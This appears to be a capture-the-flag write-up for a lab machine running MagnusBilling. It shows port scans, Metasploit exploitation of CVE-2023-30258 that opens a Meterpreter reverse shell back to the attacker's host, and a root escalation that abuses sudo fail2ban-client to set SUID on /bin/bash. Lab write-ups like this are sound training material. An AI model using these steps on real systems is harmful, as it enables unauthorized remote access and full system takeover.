

##### **Find all Ports:**
`rustscan -a 10.10.218.174`

##### **Scan all the ports using NMAP:**
`nmap -A 10.10.218.174 -p 22,80,3306,5038 -v`

##### **Result:**
```
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.218.174/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)

```


##### **Use Metasploit-Framework for search exploit:**
```
search MagnusBilling
use linux/http/magnusbilling_unauth_rce_cve_2023_30258
show options
set rhosts 10.10.218.174
set lhost 10.17.22.228
exploit
```

##### **Result:**
```
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.17.22.228:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.218.174:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 7 seconds.
[*] Elapsed time: 7.42 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.218.174
[+] Deleted qFlPWSwIcwgvTx.php
[*] Meterpreter session 1 opened (10.17.22.228:4444 -> 10.10.218.174:49250) at 2025-05-26 12:36:38 -0400
```


#### **Now dive into Post exploitation:**

##### **List sudo privileges:**
`sudo -l `

```
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```


Search: **==fail2ban-client==** exploit
## [Exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/#exploit)

```bash
# Get jail list
sudo /usr/bin/fail2ban-client status
# Choose one of the jails from the "Jail list" in the output.
sudo /usr/bin/fail2ban-client get <JAIL> actions
# Create a new action with arbitrary name (e.g. "evil")
sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
# Set payload to actionban
sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
# Trigger the action
sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
# Now we gain a root
/bin/bash -p
```

